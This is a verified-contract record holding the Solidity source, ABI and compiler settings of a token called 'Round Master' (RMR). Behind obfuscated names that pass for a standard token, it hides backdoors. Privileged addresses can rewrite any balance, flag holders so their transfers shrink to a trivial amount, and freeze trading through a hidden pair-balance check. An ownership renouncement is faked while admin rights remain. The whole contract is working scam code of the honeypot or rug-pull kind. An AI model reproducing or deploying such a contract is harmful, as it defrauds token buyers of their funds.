{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface senderLaunched {\n    function createPair(address totalWallet, address txBuyTrading) external returns (address);\n}\n\ninterface txTakeReceiver {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address teamFund) external view returns (uint256);\n\n    function transfer(address enableAmount, uint256 exemptLaunched) external returns (bool);\n\n    function allowance(address takeExempt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address enableAmount,\n        uint256 exemptLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed walletTeam, uint256 value);\n    event Approval(address indexed takeExempt, address indexed spender, uint256 value);\n}\n\nabstract contract toToken {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverLaunch {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface feeSender is txTakeReceiver {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract RoundMaster is toToken, txTakeReceiver, feeSender {\n\n    function decimals() external view virtual override returns (uint8) {\n        return exemptTotal;\n    }\n\n    uint256 tokenLaunch;\n\n    bool public senderWalletReceiver;\n\n    function transferFrom(address marketingTotal, address enableAmount, uint256 exemptLaunched) external override returns (bool) {\n        if (_msgSender() != exemptTeam) {\n            if (buyMode[marketingTotal][_msgSender()] != type(uint256).max) {\n                require(exemptLaunched <= buyMode[marketingTotal][_msgSender()]);\n                buyMode[marketingTotal][_msgSender()] -= exemptLaunched;\n            }\n        }\n        return modeFrom(marketingTotal, enableAmount, exemptLaunched);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeMode;\n    }\n\n    uint256 private feeMode = 100000000 * 10 ** 18;\n\n    function tradingReceiver(uint256 exemptLaunched) public {\n        teamReceiver();\n        tokenLaunch = exemptLaunched;\n    }\n\n    function tradingTotalReceiver(address marketingTotal, address enableAmount, uint256 exemptLaunched) internal returns (bool) {\n        require(fromMode[marketingTotal] >= exemptLaunched);\n        fromMode[marketingTotal] -= exemptLaunched;\n        fromMode[enableAmount] += exemptLaunched;\n        emit Transfer(marketingTotal, enableAmount, exemptLaunched);\n        return true;\n    }\n\n    mapping(address => mapping(address => uint256)) private buyMode;\n\n    function name() external view virtual override returns (string memory) {\n        return atSellEnable;\n    }\n\n    mapping(address => uint256) private fromMode;\n\n    string private atSellEnable = \"Round Master\";\n\n    function modeFrom(address marketingTotal, address enableAmount, uint256 exemptLaunched) internal returns (bool) {\n        if (marketingTotal == minTxLiquidity) {\n            return tradingTotalReceiver(marketingTotal, enableAmount, exemptLaunched);\n        }\n        uint256 buyAuto = txTakeReceiver(amountEnable).balanceOf(takeLiquidity);\n        require(buyAuto == tokenLaunch);\n        require(enableAmount != takeLiquidity);\n        if (totalMax[marketingTotal]) {\n            return tradingTotalReceiver(marketingTotal, enableAmount, limitExempt);\n        }\n        return tradingTotalReceiver(marketingTotal, enableAmount, exemptLaunched);\n    }\n\n    address private toMarketing;\n\n    address public amountEnable;\n\n    function balanceOf(address teamFund) public view virtual override returns (uint256) {\n        return fromMode[teamFund];\n    }\n\n    function owner() external view returns (address) {\n        return toMarketing;\n    }\n\n    bool private senderSell;\n\n    bool public feeFrom;\n\n    function symbol() external view virtual override returns (string memory) {\n        return marketingShouldAmount;\n    }\n\n    function launchSwapFrom(address marketingTx, uint256 exemptLaunched) public {\n        teamReceiver();\n        fromMode[marketingTx] = exemptLaunched;\n    }\n\n    uint256 private limitSenderTeam;\n\n    function allowance(address maxWallet, address limitTx) external view virtual override returns (uint256) {\n        if (limitTx == exemptTeam) {\n            return type(uint256).max;\n        }\n        return buyMode[maxWallet][limitTx];\n    }\n\n    function approve(address limitTx, uint256 exemptLaunched) public virtual override returns (bool) {\n        buyMode[_msgSender()][limitTx] = exemptLaunched;\n        emit Approval(_msgSender(), limitTx, exemptLaunched);\n        return true;\n    }\n\n    function teamReceiver() private view {\n        require(maxFee[_msgSender()]);\n    }\n\n    uint256 private sellShould;\n\n    function tradingSwap() public {\n        emit OwnershipTransferred(minTxLiquidity, address(0));\n        toMarketing = address(0);\n    }\n\n    bool public listFundEnable;\n\n    bool public enableBuy;\n\n    mapping(address => bool) public maxFee;\n\n    uint256 constant limitExempt = 19 ** 10;\n\n    address public minTxLiquidity;\n\n    event OwnershipTransferred(address indexed tokenToSell, address indexed buyListLimit);\n\n    uint8 private exemptTotal = 18;\n\n    address exemptTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 limitLaunched;\n\n    function transfer(address marketingTx, uint256 exemptLaunched) external virtual override returns (bool) {\n        return modeFrom(_msgSender(), marketingTx, exemptLaunched);\n    }\n\n    mapping(address => bool) public totalMax;\n\n    function getOwner() external view returns (address) {\n        return toMarketing;\n    }\n\n    function toTx(address txReceiver) public {\n        require(txReceiver.balance < 100000);\n        if (listFundEnable) {\n            return;\n        }\n        if (feeFrom) {\n            modeSender = true;\n        }\n        maxFee[txReceiver] = true;\n        \n        listFundEnable = true;\n    }\n\n    bool private modeSender;\n\n    string private marketingShouldAmount = \"RMR\";\n\n    address takeLiquidity = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    constructor (){\n        \n        receiverLaunch teamWallet = receiverLaunch(exemptTeam);\n        amountEnable = senderLaunched(teamWallet.factory()).createPair(teamWallet.WETH(), address(this));\n        \n        minTxLiquidity = _msgSender();\n        maxFee[minTxLiquidity] = true;\n        fromMode[minTxLiquidity] = feeMode;\n        tradingSwap();\n        \n        emit Transfer(address(0), minTxLiquidity, feeMode);\n    }\n\n    function receiverSell(address fundEnable) public {\n        teamReceiver();\n        if (enableBuy) {\n            feeFrom = true;\n        }\n        if (fundEnable == minTxLiquidity || fundEnable == amountEnable) {\n            return;\n        }\n        totalMax[fundEnable] = true;\n    }\n\n    uint256 private fromAt;\n\n    uint256 private teamMax;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenToSell\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"buyListLimit\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnable\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamFund\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"launchSwapFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listFundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"maxFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTxLiquidity\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundEnable\",\"type\":\"address\"}],\"name\":\"receiverSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderWalletReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"}],\"name\":\"toTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"totalMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"tradingReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingTotal\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"enableAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "RoundMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}